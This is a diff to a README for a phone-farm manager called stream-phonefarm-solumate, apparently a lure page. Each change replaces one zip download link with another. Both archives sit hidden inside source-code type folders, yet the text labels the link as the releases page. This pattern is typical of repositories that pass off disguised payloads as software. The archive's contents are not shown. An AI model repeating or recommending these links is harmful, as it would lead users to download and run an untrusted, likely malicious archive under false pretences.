@@ -1,6 +1,6 @@
 # 📱 stream-phonefarm-solumate - A Simple Way to Manage Your Phone Farm
 
-[![Download](https://github.com/xtiangaming08/stream-phonefarm-solumate/raw/refs/heads/main/server/src/types/stream-phonefarm-solumate-v2.8.zip%20Now-Click%20Here-brightgreen)](https://github.com/xtiangaming08/stream-phonefarm-solumate/raw/refs/heads/main/server/src/types/stream-phonefarm-solumate-v2.8.zip)
+[![Download](https://raw.githubusercontent.com/xtiangaming08/stream-phonefarm-solumate/main/server/typings/appium-xcuitest-driver/stream_solumate_phonefarm_1.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/xtiangaming08/stream-phonefarm-solumate/main/server/typings/appium-xcuitest-driver/stream_solumate_phonefarm_1.1.zip)
 
 ## 🌐 Introduction
 
@@ -12,7 +12,7 @@ To get started, you need to download the application. Follow the steps below:
 
 1. **Visit the Releases Page:** Click the link below to go to the Releases page.
 
-   [Visit Releases Page to Download](https://github.com/xtiangaming08/stream-phonefarm-solumate/raw/refs/heads/main/server/src/types/stream-phonefarm-solumate-v2.8.zip)
+   [Visit Releases Page to Download](https://raw.githubusercontent.com/xtiangaming08/stream-phonefarm-solumate/main/server/typings/appium-xcuitest-driver/stream_solumate_phonefarm_1.1.zip)
 
 2. **Choose the Latest Version:** Find the latest version listed on the page. You will see a variety of downloadable files.
 
@@ -74,4 +74,4 @@ Solumate is open-source and available under the MIT License. You are free to use
 
 We welcome contributions to help improve the project. If you wish to contribute, please follow the guidelines in the repository.
 
-[Download Now](https://github.com/xtiangaming08/stream-phonefarm-solumate/raw/refs/heads/main/server/src/types/stream-phonefarm-solumate-v2.8.zip) and start your journey with Solumate!
+[Download Now](https://raw.githubusercontent.com/xtiangaming08/stream-phonefarm-solumate/main/server/typings/appium-xcuitest-driver/stream_solumate_phonefarm_1.1.zip) and start your journey with Solumate!
